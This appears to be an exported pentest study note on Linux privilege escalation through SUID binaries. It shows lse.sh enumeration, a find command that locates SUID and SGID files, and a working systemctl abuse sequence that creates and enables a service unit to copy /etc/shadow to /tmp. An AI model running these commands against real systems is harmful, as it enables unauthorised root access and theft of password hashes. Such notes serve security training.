<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abuse of functionality of executables</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Abuse of functionality of executables</h1><br/>0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -i <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">more</span></pre></div><br />    <a href=""><img src="images/1853-1.png" alt="images/1853-1.png" /></a><br />1. manually locate files with the SUID or SGID bits set:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span> -type f -a <span style="color:#333333;font-weight:400">\(</span> -perm -u+s -o -perm -g+s <span style="color:#333333;font-weight:400">\)</span> -exec <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">{}</span> <span style="color:#333333;font-weight:400">\;</span> 2&gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</pre></div><br />    <a href=""><img src="images/1853-2.png" alt="images/1853-2.png" /></a><br /><br /><br /><br /><strong>systemctl</strong> (<a href="https://gtfobins.github.io/gtfobins/wget/#file-upload">https://gtfobins.github.io/gtfobins/wget/#file-upload</a>)<br />       We have to run these commands, one after the other, <span style="text-decoration:underline;">but first we need to edit them a little bit</span><br />       <a href=""><img src="images/1853-3.png" alt="images/1853-3.png" /></a><br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ TF=$<span style="color:#ff9d00;font-weight:700">(mktemp)</span>.service<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&#39;[Service]<br />&gt; ExecStart=/bin/sh -c &quot;cat /etc/shadow &gt; /tmp/output&quot;<br />&gt; [Install]<br />&gt; WantedBy=multi-user.target&#39;</span> &gt; <span style="color:#7f0044;font-weight:400">$TF</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>systemctl link <span style="color:#7f0044;font-weight:400">$TF</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>systemctl <span style="color:#ff9d00;font-weight:700">enable</span> --now <span style="color:#7f0044;font-weight:400">$TF</span><br /><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>output</pre></div></div>
</body>
</html>
